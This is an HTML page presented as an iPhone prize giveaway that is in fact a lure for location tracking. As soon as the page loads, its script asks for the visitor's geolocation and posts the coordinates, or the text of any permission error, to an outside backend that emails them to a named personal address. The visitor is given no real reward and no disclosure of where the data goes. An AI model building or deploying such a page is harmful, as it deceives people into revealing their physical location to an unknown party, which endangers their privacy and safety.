<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone Reward Form</title>
    <!-- Bootstrap CSS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://via.placeholder.com/1920x1080'); /* Replace with the desired background URL */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .container {
            max-width: 600px;
            background: rgba(255, 255, 255, 0.85); /* Semi-transparent white background */
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .form-heading {
            color: #333;
            font-size: 1.5rem;
            margin-bottom: 20px;
        }
        .btn-primary {
            background-color: #007bff;
            border: none;
            margin-top: 15px;
        }
        .btn-primary:hover {
            background-color: #0056b3;
        }
        .form-text {
            font-size: 0.9rem;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="form-heading">Congratulations! ðŸŽ‰</h1>
        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
        <p id="locationDisplay" class="form-text">Requesting location permission...</p>
    </div>

    <!-- Bootstrap and jQuery JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <!-- JavaScript for Geolocation and Email Sending -->
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const locationDisplay = document.getElementById("locationDisplay");

            // Request location permission
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;

                        // Send location data via email
                        sendEmail(
                            "Geolocation Data",
                            `Latitude: ${latitude}, Longitude: ${longitude}`,
                            "khalilrodeni@gmail.com"
                        );
                    },
                    (error) => {
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                locationDisplay.textContent = "Location access denied by user.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                locationDisplay.textContent = "Location information is unavailable.";
                                break;
                            case error.TIMEOUT:
                                locationDisplay.textContent = "Location request timed out.";
                                break;
                            default:
                                locationDisplay.textContent = "An unknown error occurred.";
                                break;
                        }

                        // Send error message via email
                        sendEmail(
                            "Location Access Error",
                            locationDisplay.textContent,
                            "khalilrodeni@gmail.com"
                        );
                    },
                    { timeout: 10000 } // Timeout after 10 seconds
                );
            } else {
                locationDisplay.textContent = "Geolocation is not supported by this browser.";
            }
        });

        // Send Email Function
        function sendEmail(subject, message, recipientEmail) {
            const emailData = {
                subject: subject,
                message: message,
                recipient_email: recipientEmail,
                recipient_name: "Khalil Ahmed"
            };

            fetch("https://zalex-backend.onrender.com/api/send-email/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(emailData)
            })
            .then(response => {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error(`Server responded with ${response.status}`);
                }
            })
            .then(data => {
                if (data.message) {
                    console.log("Email sent successfully");
                } else if (data.error) {
                    alert("Error: " + data.error);
                }
            })
            .catch(error => {
                console.log("Error sending email:", error);
                alert("Error sending email: " + error.message);
            });
        }
    </script>
</body>
</html>
